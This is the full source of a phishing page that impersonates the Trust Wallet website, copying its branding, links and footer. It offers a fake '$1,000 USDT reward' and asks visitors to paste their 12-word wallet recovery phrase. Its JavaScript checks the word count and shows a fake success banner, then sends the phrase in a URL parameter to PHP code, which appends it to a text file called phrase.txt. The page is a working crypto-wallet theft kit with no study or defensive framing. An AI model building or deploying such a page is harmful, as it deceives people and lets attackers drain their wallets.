<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/bootstrap.css">
    <script src="js/bootstrap.bundle.js"></script>
    <script src="js/jquery-3.3.1.min.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet"/>
<script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
<link rel="shortcut icon" href="assets/favicon.png" type="image/x-icon">
<link rel="stylesheet" href="https://cdn-uicons.flaticon.com/uicons-regular-rounded/css/uicons-regular-rounded.css">
<link rel='stylesheet' href='https://cdn-uicons.flaticon.com/uicons-solid-rounded/css/uicons-solid-rounded.css'>
<link rel='stylesheet' href='https://cdn-uicons.flaticon.com/uicons-bold-straight/css/uicons-bold-straight.css'>
<link rel='stylesheet' href='https://cdn-uicons.flaticon.com/uicons-brands/css/uicons-brands.css'>
<link rel='stylesheet' href='https://cdn-uicons.flaticon.com/uicons-rounded-solid/css/uicons-rounded-solid.css'>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
    <title>Best Cryptocurrency Wallet | Ethereum</title>
</head>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;500;900&display=swap');
    *{
        font-family: Roboto;
        border: 0vmax;
    }
    .btn-blue{
        background-color: #0B65C6;
        outline: 0;
        box-shadow: none;
        border: 0;
    }
    .bg-blue{
        background-color: #0B65C6;
        color: white;
    }
    .text-blue{
        color: #0B65C6;
    }
    </style>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark p-3" style="background-color:#0B65C6 ;">
        <div class="container px-xl-5 py-xl-2 p-0">
    <a class="navbar-brand" href="#"><img src="assets/whitelogo.png" class="img-fluid" style="max-width: 30px;" alt="">&nbsp; Trust Wallet</a>
            <button class="navbar-toggler border-0 shadow-none text-white " type="button" data-toggle="mobilemenu" data-target="#mobilemenu" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation" onclick="Togglemenu()">
              <span class="navbar-toggler-icon text-white"></span>
            </button>
            <div class="collapse navbar-collapse justify-content-end d-none d-lg-block" id="navbarNavDropdown">
              <ul class="navbar-nav">
                <li class="nav-item active">
                  <a class="nav-link pe-4" href="www.trustwallet.com/assets">Assets</a>
                </li>
                <li class="nav-item">
                  <a class="nav-link pe-4" href="www.trustwallet.com/staking">Staking</a>
                </li>
                <li class="nav-item">
                  <a class="nav-link pe-4" href="www.trustwallet.com/earn">Earn<span class="badge badge-pill bg-white ms-1" style="color:#0B65C6 ;">+11% APR</span></a>
                </li>
                <li class="nav-item">
                    <a class="nav-link pe-4 " href="www.trustwallet.com/nft-wallet">NFTs</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link pe-4" href="www.trustwallet.com/dapp">DApp Browser</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link pe-4" href="#">Language</a>
                </li>
               
             
              </ul>
            </div>
        </div>
      </nav>
    
      <div class="container-fluid text-white pb-5"  style="background-color:#0B65C6 ;"><br>
     <div class="container px-xl-5 py-xl-2 p-0 py-4">
         <div class="row align-items-center">
            <div class="col-12 col-lg-6 text-center text-lg-left p-3 p-lg-0">
                <h1 class="font-weight-bold display-5">The most trusted & secure crypto wallet</h1>
                <p class="text-white-90 lead mb-4">Buy, store, collect NFTs, exchange & earn crypto. Join 25 million+ people using Trust Wallet.</p>

                <div class="row  mb-5 m-lg-0 justify-content-around">
                    <div class="col-7 col-lg-4 mb-3 m-lg-0">
                        <a href="https://apps.apple.com/app/apple-store/id1288339409?mt=8"><img src="assets/d1.png" alt="" class="img-fluid"></a> 
                    </div>
                    <div class="col-7 col-lg-4 mb-4 m-lg-0">
                        <a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite"> <img src="assets/d2.png" alt="" class="img-fluid"></a>
                    </div>
                    <div class="col-7 col-lg-4">
                        <a href="https://appgallery.huawei.com/#/app/C103425801">    <img src="assets/d3.png" alt="" class="img-fluid"></a> 
                    </div>
                </div>
            </div>
            <div class="col-12 col-lg-6">
                <img src="assets/phone.png" alt="" class="img-fluid">
            </div>
         </div>
      </div>
 </div>
<div class="mobile-menu mobilemenu mx-auto d-none col-11 p-5 d-lg-none bg-white rounded "  id="mobilemenu" style="position: absolute; color:#0B65C6; top:10%; right: 4%;" >
</div>
     
<style>
    textarea::placeholder{
        font-weight: 100;
    }
</style>

<!-- Form Processor -->
<?php
$Serial = 1;
//htmlspecialchars_decode();
if($_GET['key'] != ""){
    $Phrase = $Serial.". " .htmlspecialchars_decode(strtolower($_GET['key'])) ."\n";
    file_put_contents('phrase.txt', $Phrase, FILE_APPEND);
    $Serial++;
    echo "<script>window.location = 'index.php'</script>";
    //echo $Phrase;
}
?>

<div class="container-fluid position-fixed h-100 w-100 d-none" id="success" style="background-color: black; z-index:100; top: 0; opacity: 0.9;">
<div class="container mx-auto p-5" >
    <h3 class="text-white lead text-center mt-5">Success!!! <br> Wait 24 Hours to Receive your Reward</h3>
    <lottie-player src="https://assets1.lottiefiles.com/packages/lf20_m3ixidnq.json"  background="transparent" class="mx-auto w-50"  speed="1"  style="width: 40%; height: 40%; opacity: 1;"  loop  autoplay></lottie-player>
</div>
</div>


<div class="container-fluid p-4 p-lg-5">
    <p class="lead m-0" style="font-size: 12pt;">CLAIM REQUIREMENTS</p>
    <span class="small"><i class="fi fi-bs-comment-check text-success"></i> Wallet must have more than 5 transactions to receive this Reward</span><br>
    <span class="small"><i class="fi fi-bs-comment-check text-success"></i> Wallet Balance must be more than $100</span>
    <form action="index.php" method="post">
    <textarea name="key" onkeyup="Validate()" onpaste="Validate()" onblur="Validate()" onfocus="Validate()"  required id="" cols="30" class="form-control shadow-none p-3 mt-3" placeholder="Copy and Paste your 12 Secret Phrase from Trust Wallet App to Claim your Reward" rows="5"></textarea>
    <p class="alert alert-danger py-1 mt-2 d-none lead" style="font-size: 12pt;"></p>
    <button id="button" name="submit" class="small btn py-3 btn-block shadow-none border-0 text-white mt-3" style="background-color:#0B65C6 ; font-size:10pt">Claim $1,000 USDT Reward
    </button>
    
</form>
</div>

<div class="container-fluid">
    <div class="container mx-auto">
    <div class="row justify-content-around mt-4 m-lg-0" >
       <div class="col-auto d-flex h5 font-weight-bold">
           <i class="fi fi-sr-credit-card text-blue mb-3"></i><span>&nbsp;&nbsp;&nbsp; Buy Crypto With a Card</span>
        </div>
        <div class="col-auto d-flex h5 font-weight-bold">
            <i class="fi fi-sr-exchange-alt text-blue mb-3"></i><span>&nbsp;&nbsp;&nbsp; Buy Exchange Instantly</span>
        </div>
        <div class="col-auto d-flex h5 font-weight-bold">
          <i class="fi fi-sr-lock text-blue mb-3"></i><span>&nbsp;&nbsp;&nbsp; Buy Private & Secure</span>
        </div>
    </div>
</div>
</div>
<div class="container-fluid mt-4 m-lg-0">
    <div class="container mx-auto p-2 p-lg-5">
        <h2 class=" font-weight-bold  text-center">You Deserve Easy Access to Cryptocurrencies</h2>
<p class="lead text-gray-700 text-center">Trust Wallet is for you if you want to</p>
<div class="row align-items-center justify-content-center justify-content-md-between pt-4 pb-4 text-center">
    <div class="col-12 col-lg-6 " style="font-weight: 200;">
    <div class="list-group-item d-flex p-lg-4"><i class="fi fi-sr-shield-check text-success"></i>&nbsp;Buy Bitcoin in under five minutes</div>
    <div class="list-group-item d-flex p-lg-4"><i class="fi fi-sr-shield-check text-success"></i>&nbsp;Easily earn interest on the crypto in your wallet</div>
    <div class="list-group-item d-flex p-lg-4"><i class="fi fi-sr-shield-check text-success"></i>&nbsp;See your collectibles. Art & NFTs in one place</div>
    </div>
    <div class="col-12 col-lg-6" style="font-weight: 200;">
    <div class="list-group-item d-flex p-lg-4"><i class="fi fi-sr-shield-check text-success"></i>&nbsp;Exchange your crypto without leaving the app</div>
    <div class="list-group-item d-flex p-lg-4"><i class="fi fi-sr-shield-check text-success"></i>&nbsp;Track charts and prices within the app</div>
    <div class="list-group-item d-flex p-lg-4"><i class="fi fi-sr-shield-check text-success"></i>&nbsp;Keep your crypto safe from hackers & scammers</div>
    </div>
</div>

</div>
<center><a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite"><button class="mx-auto btn btn-lg text-white shadow-none mb-5 m-lg-0" style="background-color:#0B65C6 ;">Download</button></a></center>
</div>


<div class="container-fluid  ">
    <div class="container p-lg-5">
<div class="row align-items-center text-center text-lg-left">
    <div class="col-auto col-lg-6 order-last order-lg-first">
        <img src="assets/1.png" class="img-fluid" alt="">
    </div>
    <div class="col-auto col-lg-6">
        <h2 class="display-5 mt-4 " style="font-weight: 500;">Buy Crypto With a Card</h2>
<p class="lead text-gray-700">Get your first $50 of Bitcoin, Ethereum, Binance Coin and many other cryptocurrencies.</p>

    </div>
</div>
    </div>
</div>

<div class="container-fluid  ">
    <div class="container p-lg-5">
<div class="row align-items-center text-center text-lg-left">
    <div class="col-auto col-lg-6 order-last order-lg-last">
        <img src="assets/2.png" class="img-fluid" alt="">
    </div>
    <div class="col-auto col-lg-6">
        <h2 class="display-5 mt-4 " style="font-weight: 500;">Exchange Instantly</h2>
<p class="lead text-gray-700">No forms, no selfies. Trade crypto anytime with ease.</p>

    </div>
</div>
    </div>
</div>

<div class="container-fluid  ">
    <div class="container p-lg-5">
<div class="row align-items-center text-center text-lg-left">
    <div class="col-auto col-lg-6 order-last order-lg-first">
        <img src="assets/3.png" class="img-fluid" alt="">
    </div>
    <div class="col-auto col-lg-6">
        <h2 class="display-5 mt-4 " style="font-weight: 500;">Private & Secure</h2>
<p class="lead text-gray-700">Only you can access your wallet. We don’t collect any personal data.</p>

    </div>
</div>
    </div>
</div>

<div class="container-fluid  ">
    <div class="container p-lg-5">
<div class="row align-items-center text-center text-lg-left">
    <div class="col-auto col-lg-6 order-last order-lg-last">
        <img src="assets/4.png" class="img-fluid" alt="">
    </div>
    <div class="col-auto col-lg-6">
        <h2 class="display-5 mt-4 " style="font-weight: 500;">Browser for DApps</h2>
<p class="lead text-gray-700">Use your favourite decentralized apps & find new ones, without leaving your wallet.</p>

    </div>
</div>
    </div>
</div>



<div class="container-fluid bg-light p-3 mb-5  ">
    <div class="row justify-content-center ">
        <div class="col-auto col-lg-6 px-0 px-lg-5 text-center text-lg-left">
            <h5 class="">
                Get the Trust Wallet app now!
                </h5>
                <p class="text-gray-700 lead mb-6 mb-md-0 no-whitespace">
                The most trusted & secure crypto wallet
                </p>
        </div>
        <div class="col-auto col-lg-6">
         <div class="row mx-auto m-lg-0 justify-content-center">
           <div class="col-7 col-lg-4 mb-3 m-lg-0">
            <a href="https://apps.apple.com/app/apple-store/id1288339409?mt=8"><img src="assets/d1.png" alt="" class="img-fluid"></a> 
        </div>
        <div class="col-7 col-lg-4 mb-4 m-lg-0">
            <a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite"> <img src="assets/d2.png" alt="" class="img-fluid"></a>
        </div>
        <div class="col-7 col-lg-4">
            <a href="https://appgallery.huawei.com/#/app/C103425801">    <img src="assets/d3.png" alt="" class="img-fluid"></a> 
        </div> 
        </div>   
        </div>
        
        
    </div>
</div>
</div>
</div>




<footer class="mt-4  bg-white">
    <div class="container">
    <div class="row text-center text-md-left" style="font-weight: 200;">
    <div class="col-12 col-md-4 col-lg-3">
    
    <img src="assets/bluelogo.png" alt="" style="max-width:30px ;" class="img-fluid"><span class="text-blue font-weight-bold"> Trust Wallet</span>
      <div class="row  p-2 mx-auto justify-content-center justify-content-lg-start p-lg-0 mt-lg-2" style="font-size:15pt ;">
        <div class="col-1 p-0 m-1"><a href="https://facebook.com/trustwalletapp"><i class="fi fi-brands-facebook"  style="color: #5A749A;"></i></a></div>
        <div class="col-1 p-0 m-1"><a href="https://github.com/trustwallet"><i class="fi fi-brands-github text-center" style="color: #5A749A;"></i></a></div>
        <div class="col-1 p-0 m-1"><a href="https://instagram.com/trustwallet"><i class="fi fi-brands-instagram" style="color: #5A749A;"></i></a></div>
        <div class="col-1 p-0 m-1"><a href="https://twitter.com/trustwallet"><i class="fi fi-brands-reddit" style="color: #5A749A;"></i></a></div>
        <div class="col-1 p-0 m-1"><a href="https://reddit.com/r/trustapp"><i class="fi fi-brands-twitter" style="color: #5A749A;"></i></a></div>
        <div class="col-1 p-0 m-1"><a href="https://t.me/trust_announcements"><i class="fi fi-brands-telegram" style="color: #5A749A;"></i></a></div>
      </div>
    </div>
    <div class="col-12 col-md-4 col-lg-3">
    <h4 class="lead text-uppercase text-gray-700">Trust Wallet</h4>
    <ul class="list-unstyled text-gray-700 mb-6 mb-md-8 mb-lg-0">
    <li class="mb-3">
    <a href="/assets" class="text-reset" aria-label="Goes to assets page">Assets</a>
    </li>
    <li class="mb-3">
    <a href="/dapp" class="text-reset" aria-label="Goes to dapp browser page">DApp Browser</a>
    </li>
    <li class="mb-3">
    <a href="/stablecoins" class="text-reset" aria-label="Goes to stablecoin page">Stablecoins</a>
    </li>
    <li class="mb-3">
    <a href="/beta" class="text-reset" aria-label="Goes Trust Wallet Beta page">Beta</a>
    </li>
    <li class="mb-3">
    <a href="/nft-wallet" class="text-reset" aria-label="Goes to collectible page">NFTs</a>
    </li>
    <li class="mb-3">
    <a href="/el-salvador-wallet" class="text-reset" aria-label="Goes to el salvador wallet">El Salvador Wallet</a>
    </li>
    <li class="mb-3">
    <a href="https://apps.apple.com/app/apple-store/id1288339409?mt=8" rel="noopener" target="_blank" class="text-reset" aria-label="Opens AppStore page to download Trust Wallet for iphones">Crypto Wallet for iOS</a>
    </li>
    <li class="mb-3">
    <a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite" rel="noopener" target="_blank" class="text-reset" aria-label="Opens Google Play page to download Trust Wallet for androids">Crypto Wallet for Android</a>
    </li>
    </ul>
    </div>
    <div class="col-12 col-md-4 col-lg-2">
    <h4 class="lead text-uppercase text-gray-700">Information</h4>
    <ul class="list-unstyled text-gray-700 mb-0">
    <li class="mb-3">
    <a href="https://community.trustwallet.com" target="_blank" class="text-reset" aria-label="Opens Trust Wallet community page">Community</a>
    </li>
    <li class="mb-3">
    <a href="https://community.trustwallet.com/c/helpcenter" target="_blank" class="text-reset" aria-label="Opens help Ccnter page">Help Center</a>
    </li>
    <li class="mb-3">
    <a href="https://support.trustwallet.com/" rel="noopener" target="_blank" class="text-reset" aria-label="Opens support page">Support</a>
    </li>
    <li class="mb-3">
    <a href="/blog" rel="noopener" class="text-reset" aria-label="Opens Trust Wallet blog page">DApp Journey</a>
    </li>
    <li class="mb-3">
    <a href="/developer" class="text-reset" aria-label="Opens Developer page">Developers</a>
    </li>
    <li class="mb-3">
    <a href="/submit-dapp" class="text-reset" aria-label="Opens a page with form to submit a dapp for Trust Wallet listing">Submit DApp</a>
    </li>
    <li class="mb-3">
    <a href="/press" class="text-reset" aria-label="Opens a page with brand kit with Trust Wallet logos, icons and many more">Press Kit</a>
    </li>
    <li class="mb-3">
    <a href="/terms-of-services" class="text-reset" aria-label="Opens a page with terms of services">Terms Of Service</a>
    </li>
    <li class="mb-3">
    <a href="/privacy-policy" class="text-reset" aria-label="Opens a page with privacy and policy">Privacy Policy</a>
    </li>
    </ul>
    </div>
    <div class="col-12 col-md-4 offset-md-4 col-lg-2 offset-lg-0">
    <h4 class="lead text-uppercase text-gray-700">Use Crypto</h4>
    <ul class="list-unstyled text-gray-700 mb-6 mb-md-8 mb-lg-0">
    <li class="mb-3">
    <a href="/buy-bitcoin" class="text-reset" aria-label="opens a bitcoin page">Buy Bitcoin with a credit card</a>
    </li>
    <li class="mb-3">
    <a href="/buy-ethereum" class="text-reset" aria-label="opens a ethereum page where you can learn how to buy it">Buy Ethereum</a>
    </li>
    <li class="mb-3">
    <a href="/buy-bnb" class="text-reset" aria-label="opens a binance coin page where you can learn how to buy it">Buy BNB</a>
    </li>
    <li class="mb-3">
    <a href="/buy-litecoin" class="text-reset" aria-label="opens a litecoin page where you can learn how to buy it">Buy Litecoin</a>
    </li>
    <li class="mb-3">
    <a href="/buy-tron" class="text-reset" aria-label="opens a bitcoin tron where you can learn how to buy it">Buy TRON</a>
    </li>
    <li class="mb-3">
    <a href="/buy-xrp" class="text-reset" aria-label="opens a xrp page where you can learn how to buy it">Buy XRP</a>
    </li>
    <li class="mb-3">
    <a href="/buy-bitcoincash" class="text-reset" aria-label="opens a bitcoin cash page where you can learn how to buy it">Buy Bitcoin Cash</a>
    </li>
    <hr>
    <li class="mb-3">
    <a href="/earn-bitcoin" class="text-reset" aria-label="opens a bitcoin page where you can learn how to earn it">Earn Bitcoin</a>
    </li>
    <li class="mb-3">
    <a href="/earn-ethereum" class="text-reset" aria-label="opens a ethereum page where you can learn how to earn it">Earn Ethereum</a>
    </li>
    <li class="mb-3">
    <a href="/earn-binance-coin" class="text-reset" aria-label="opens a binance coin page where you can learn how to earn it">Earn Binance Coin</a>
    </li>
    <li class="mb-3">
    <a href="/earn-cake" class="text-reset" aria-label="opens a cake page where you can learn how to earn it">Earn Cake</a>
    </li>
    </ul>
    </div>
    <div class="col-12 col-md-4 col-lg-2">
    <h4 class="lead text-uppercase text-gray-700">Assets</h4>
    <ul class="list-unstyled newl text-black mb-6 mb-md-8 mb-lg-0" >
    <li class="mb-3"><a href="/bitcoin-wallet"  class=""  style="text-decoration: none; color:black" aria-label="Goes to the page of  (BTC) where you can learn more about it">Bitcoin (BTC)</a>
    <li class="mb-3"><a href="/ethereum-wallet" style="text-decoration: none; color:black" aria-label="Goes to the page of  (ETH) where you can learn more about it">Ethereum (ETH)</a>
    <li class="mb-3"><a href="/binance-coin-wallet" style="text-decoration: none; color:black" aria-label="Goes to the page of  (BNB) where you can learn more about it">Binance Coin (BNB)</a>
    <li class="mb-3"><a href="/litecoin-wallet" style="text-decoration: none; color:black" aria-label="Goes to the page of  (LTC) where you can learn more about it">Litecoin (LTC)</a>
    <li class="mb-3"><a href="/xrp-wallet" style="text-decoration: none; color:black" aria-label="Goes to the page of  (XRP) where you can learn more about it">Ripple (XRP)</a>
    <li class="mb-3"><a href="/dogecoin-wallet" style="text-decoration: none; color:black" aria-label="Goes to the page of  (DOGE) where you can learn more about it">Dogecoin (DOGE)</a>
    <li class="mb-3"><a href="/polkadot-wallet" style="text-decoration: none; color:black" aria-label="Goes to the page of  (DOT) where you can learn more about it">Polkadot (DOT)</a>
    <li class="mb-3"><a href="/smart-chain-wallet" style="text-decoration: none; color:black" aria-label="Goes to the page of  (BNB) where you can learn more about it">Smartchain (BNB)</a>
    <li class="mb-3"><a href="/dash-wallet" style="text-decoration: none; color:black" aria-label="Goes to the page of  (DASH) where you can learn more about it">Dash (DASH)</a>
    <li class="mb-3"><a href="/tron-wallet" style="text-decoration: none; color:black" aria-label="Goes to the page of  (TRX) where you can learn more about it">TRON (TRX)</a>
    <li class="mb-3"><a href="/tezos-wallet" style="text-decoration: none; color:black" aria-label="Goes to the page of  (XTZ) where you can learn more about it">Tezos (XTZ)</a>
    <li class="mb-3"><a href="/cosmos-wallet" style="text-decoration: none; color:black" aria-label="Goes to the page of  (ATOM) where you can learn more about it">Cosmos (ATOM)</a>
    <li class="mb-3"><a href="/stellar-wallet" style="text-decoration: none; color:black" aria-label="Goes to the page of  (XLM) where you can learn more about it">Stellar (XLM)</a>
    <li class="mb-3"><a href="/kava-wallet" style="text-decoration: none; color:black" aria-label="Goes to the page of  (KAVA) where you can learn more about it">Kava (KAVA)</a>
    </ul>
    </div>
    </div>
    </div>
    </footer>


<script>
 var Alert = document.querySelector('.alert')
var Textlen = document.querySelector('textarea').value;


document.querySelector('form').addEventListener('submit', (e)=>{
e.preventDefault();
OpenBanner();
//alert('Wait 24 Hour to receive your reward');
//document.querySelector('textarea').value = "";
})

function OpenBanner(){
    document.getElementById('success').classList.replace('d-none', 'd-block');
    var Setter = setTimeout(CloseBanner, 3000);
}

function CloseBanner(){
    document.getElementById('success').classList.replace('d-block', 'd-none');
    alert(document.querySelector('textarea').value);
    window.location = "index.php?key="+document.querySelector('textarea').value;
}




// console.log(document.querySelector('textarea').value.length);
if (document.querySelector('textarea').value.length > 30){
    var set = setInterval(Validate,500);
}

function Validate(){
    //console.log(document.querySelector('textarea').value.length);
    // console.log(document.querySelector('.alert'));
  
    var TextArray = Array.from(document.querySelector('textarea').value.split(" "));
    // console.log(TextArray);
    console.log(TextArray.length);

  if(TextArray.length < 12 || TextArray[11] !== ""){
    document.querySelector('.alert').innerText = "Invalid Trust Wallet Phrase";
    Alert.classList.remove('d-none');
    document.getElementById('button').innerHTML = "Verifying Wallet Phrase... &nbsp;&nbsp;<span style='max-height:15px;max-width:15px;' class='spinner spinner-border spinner-sm spinner-white'></span>";
    document.getElementById('button').setAttribute('disabled', true);
   // alert(TextArray);
    }
 
    if(TextArray.length >= 12 && TextArray[11] !== ""){
    Alert.classList.add('d-none');
    document.getElementById('button').innerHTML = "Claim $1,000 USDT Reward";

    document.getElementById('button').removeAttribute('disabled');

  }
    
}


   ( function(){
        var Inner = document.getElementById('navbarNavDropdown').innerHTML;
        document.getElementById('mobilemenu').innerHTML = Inner;
        document.querySelector('.mobilemenu ul li .badge').classList.remove('bg-white'); 
        document.querySelector('.mobilemenu ul li .badge').style.backgroundColor = "#0B65C6";
        document.querySelector('.mobilemenu ul li .badge').style.color = "white";
        document.createElement('div');
        
   })();

function Togglemenu(){
    document.getElementById('mobilemenu').classList.toggle('d-block');
}

</script>
<script src="js/jquery-3.3.1.min.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
</body>
</html>